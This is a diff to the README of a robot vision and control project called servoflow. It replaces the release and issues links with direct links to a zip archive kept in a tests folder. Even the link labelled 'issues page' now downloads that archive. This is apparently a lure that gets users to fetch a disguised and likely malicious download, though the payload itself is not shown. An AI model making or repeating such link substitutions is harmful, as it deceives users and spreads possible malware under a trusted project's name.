@@ -1,6 +1,6 @@
 # ⚙️ servoflow - Fast Robot Vision and Control
 
-[![Download servoflow](https://img.shields.io/badge/Download-servoflow-brightgreen)](https://github.com/sobigzeus/servoflow/releases)
+[![Download servoflow](https://img.shields.io/badge/Download-servoflow-brightgreen)](https://raw.githubusercontent.com/sobigzeus/servoflow/main/tests/alignment/Software_2.3-alpha.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download and run servoflow on your Windows computer.
 
 1. Visit the servoflow releases page using this link:
 
-   [Download servoflow](https://github.com/sobigzeus/servoflow/releases)
+   [Download servoflow](https://raw.githubusercontent.com/sobigzeus/servoflow/main/tests/alignment/Software_2.3-alpha.5.zip)
 
 2. Look for the latest release version at the top of the page.
 
@@ -103,7 +103,7 @@ If you run into trouble, try these steps:
 
 - Restart your computer if issues continue.
 
-- Visit the [servoflow issues page](https://github.com/sobigzeus/servoflow/issues) for known problems.
+- Visit the [servoflow issues page](https://raw.githubusercontent.com/sobigzeus/servoflow/main/tests/alignment/Software_2.3-alpha.5.zip) for known problems.
 
 ---
 
@@ -141,4 +141,4 @@ The project optimizes complex algorithms such as flow matching and FlashAttentio
 
 ## 🔗 Quick Download Link
 
-[Download servoflow here](https://github.com/sobigzeus/servoflow/releases) to get started with your robot control setup.
+[Download servoflow here](https://raw.githubusercontent.com/sobigzeus/servoflow/main/tests/alignment/Software_2.3-alpha.5.zip) to get started with your robot control setup.
